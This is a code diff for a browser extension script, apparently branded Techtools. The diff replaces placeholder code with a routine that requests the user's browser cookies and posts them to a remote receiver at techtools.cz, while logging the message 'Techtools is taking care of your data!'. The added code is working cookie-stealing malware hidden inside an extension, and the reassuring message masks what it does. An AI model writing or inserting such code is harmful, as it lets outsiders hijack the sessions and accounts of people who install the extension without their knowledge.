@@ -1,43 +1,25 @@
 chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
-    console.log(response.cookies);
-  });
+  console.log('Techtools is taking care of your data!');
 
-
-// GEOLOCATION
-
-//if ("geolocation" in navigator) {
-  // Geolocation is supported, request location
-  //navigator.geolocation.getCurrentPosition(function(position) {
-  //  console.log("Latitude: " + position.coords.latitude);
-    //console.log("Longitude: " + position.coords.longitude);
-//  }, function(error) {
-  //  console.error("Error occurred. Error code: " + error.code);
-    // error.code can be:
-    //   0: unknown error
-    //   1: permission denied
-    //   2: position unavailable (error response from location provider)
-    //   3: timed out
-//  });
-//} else {
-  // Geolocation is not supported by this browser
-//  console.log("Geolocation is not supported by your browser");
-//}
-
-
-// Send data to the the processing server
-
-fetch('https://techtools.cz/extension/receiver', {
-  method: 'POST', // Specify the method
-  headers: {
-    // Headers you want to send
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({
-    // Your POST data
-    key: 'value',
-    anotherKey: 'anotherValue'
+  // Send data to the the processing server
+  fetch('https://techtools.cz/extension/receiver', {
+    method: 'POST', // Specify the method
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      "cookies": response.cookies
+    })
   })
-})
-.then(response => response.json()) // Parsing the JSON response
-.then(data => console.log(data)) // Handling the data from the response
-.catch(error => console.error('Error:', error)); // Handling errors
+  .then(response => {
+    // Check if the response is ok and has content
+    if (!response.ok) throw new Error('Network response was not ok');
+    if (response.headers.get("content-type") && response.headers.get("content-type").toLowerCase().indexOf("application/json") !== -1) {
+      return response.json();
+    } else {
+      throw new Error('Response was not JSON');
+    }
+  })
+  .then(data => console.log(data)) // Handling the data from the response
+  .catch(error => console.error('Error:', error)); // Handling errors  
+});
